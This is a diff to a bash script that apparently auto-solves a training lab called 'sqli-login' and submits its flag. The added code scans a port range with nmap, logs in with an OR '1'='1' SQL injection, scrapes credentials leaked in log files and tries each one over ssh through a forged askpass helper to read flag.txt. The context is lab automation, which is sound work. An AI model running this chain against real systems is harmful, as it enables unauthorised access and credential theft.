@@ -34,6 +34,19 @@ attack_start_and_wait() { # $1 = target id, $2 = name of a var to set with the l
   return 1
 }
 
+# sqli-login's ports are random per student: scan the web range and keep the open port whose / is a
+# 200 (the decoy HTTP listener answers 401 to everything). Sets $2 to the port.
+find_login_port() { # $1 = addr, $2 = name of a var to set
+  local p
+  for p in $(nmap -Pn -p 8000-8999 --open -oG - "$1" 2>/dev/null | grep -o '[0-9]*/open' | cut -d/ -f1); do
+    if [ "$(curl -s -o /dev/null -m 3 -w '%{http_code}' "http://$1:$p/")" = 200 ]; then
+      eval "$2=\$p"
+      return 0
+    fi
+  done
+  return 1
+}
+
 extract_flag() { grep -o 'flag{[^}]*}' | head -1; }
 
 # Redefine the engine default (git-fundamentals' step_wrap_round cd's into a cloned repo this pack
@@ -47,19 +60,50 @@ step_wrap_round() {
 
 # -- Lab 1: sqli-login -- boolean-true username closes the quote, admin's row matches regardless
 # of password (same payload the lab's hints walk a student to: a single quote, then OR '1'='1').
+# The portal then links three log files that leak accounts; only one logs into the box over ssh.
 step_sqli_login() {
   narrate "Lab 1 -- sqli-login: starting the target"
-  local addr flag
+  local addr flag port
   if ! attack_start_and_wait sqli-login addr; then
     narrate "sqli-login never went live this round -- skipping"
     return 0
   fi
-  narrate "slot live at $addr -- closing the username's quote with OR '1'='1'"
-  flag="$(curl -s -X POST "http://$addr:5000/login" \
-    --data-urlencode "username=admin' OR '1'='1' -- " --data-urlencode 'password=anything' \
-    | extract_flag)"
+  run_cmd "nmap -p 8000-8999 --open $addr"
+  if ! find_login_port "$addr" port; then
+    narrate "sqli-login: no login page found on any open port this round -- skipping"
+    return 0
+  fi
+  narrate "login portal on port $port -- closing the username's quote with OR '1'='1'"
+  local jar logs creds user pass askpass
+  jar="$(mktemp)"
+  curl -s -c "$jar" -o /dev/null -X POST "http://$addr:$port/login" \
+    --data-urlencode "username=admin' OR '1'='1' -- " --data-urlencode 'password=anything'
+  narrate "logged in -- reading the three operations logs for credentials"
+  logs=""
+  for f in print-queue maintenance helpdesk-sync; do
+    logs="$logs$(curl -s -b "$jar" "http://$addr:$port/logs/$f.log")
+"
+  done
+  rm -f "$jar"
+  # Three ways the logs leak a credential: user=/password=, sshpass -p, "credentials user / pw".
+  creds="$(printf '%s' "$logs" | sed -n \
+    -e "s/.* user=\([^ ]*\) password=\([^ ]*\).*/\1 \2/p" \
+    -e "s/.*sshpass -p '\([^']*\)' ssh \([^@ ]*\)@.*/\2 \1/p" \
+    -e "s/.*credentials \([^ ]*\) \/ \([^ ]*\).*/\1 \2/p")"
+  askpass="$(mktemp)"
+  chmod 700 "$askpass"
+  flag=""
+  while read -r user pass; do
+    [ -n "$user" ] || continue
+    narrate "trying $user over ssh"
+    printf '#!/bin/sh\necho "%s"\n' "$pass" > "$askpass"
+    flag="$(SSH_ASKPASS="$askpass" SSH_ASKPASS_REQUIRE=force ssh -o StrictHostKeyChecking=accept-new \
+      -o PubkeyAuthentication=no -o NumberOfPasswordPrompts=1 "$user@$addr" 'cat flag.txt' 2>/dev/null | extract_flag)"
+    [ -z "$flag" ] || break
+  done <<< "$creds"
+  rm -f "$askpass"
   if [ -z "$flag" ]; then
-    narrate "sqli-login: no flag in the response this round -- skipping submit"
+    narrate "sqli-login: no flag over ssh this round -- skipping submit"
     return 0
   fi
   run_cmd "dojo-flag submit sqli-login '$flag'"
